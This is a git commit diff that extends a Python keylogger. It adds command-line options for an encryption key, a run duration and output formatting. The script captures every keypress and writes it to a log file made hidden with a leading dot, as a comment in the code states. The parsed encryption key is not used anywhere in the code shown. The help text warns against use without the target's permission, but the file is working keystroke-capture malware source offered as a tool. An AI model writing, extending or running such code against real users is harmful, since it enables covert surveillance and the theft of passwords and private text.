d18cc365e398c826a6ed619d1ddcfaaeeaf5ca4e
Nathan Hartley <91960789+NateHartley@users.noreply.github.com>
2025-01-23 14:42:28 +0000

    Arguments can be parsed into program

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,36 @@
 import keyboard
+import argparse
+import time
 
-keys_log = "keystrokes.log"
-open(keys_log, "w").close()
+parser = argparse.ArgumentParser(
+    prog="Python Keylogger",
+    description="Captures and stores the key presses of a user.",
+    epilog="Do not use without permission from the targeted user."
+)
+
+parser.add_argument("-k", "--key", help="used to encrypt/decrypt contents of .keystrokes.log")
+parser.add_argument("-t", "--time", type=int, help="number of seconds the program with run for")
+parser.add_argument("-f", "--format", action="store_true", help="prints each keypress on a new line in .keystrokes.log")
+
+args = parser.parse_args()
+key = args.key
+seconds = args.time
+f = args.format
+
+# beginning . hides log file
+log_file = ".keystrokes.log"
+
+# w mode so log file is overwritten on run
+open(log_file, "w").close()
 
 def press_key(event):
-    with open(keys_log, "a") as file:
-        # Each key press on new line
-        file.write("{}\n".format(event.name))
-
-        # All key presses on same line
-        # file.write(event.name)
+    with open(log_file, "a") as file:
+        if f:
+            # Each key press on new line
+            file.write("{}\n".format(event.name))
+        else:
+            # All key presses on same line
+            file.write(event.name)
 
 keyboard.on_press(press_key)
 
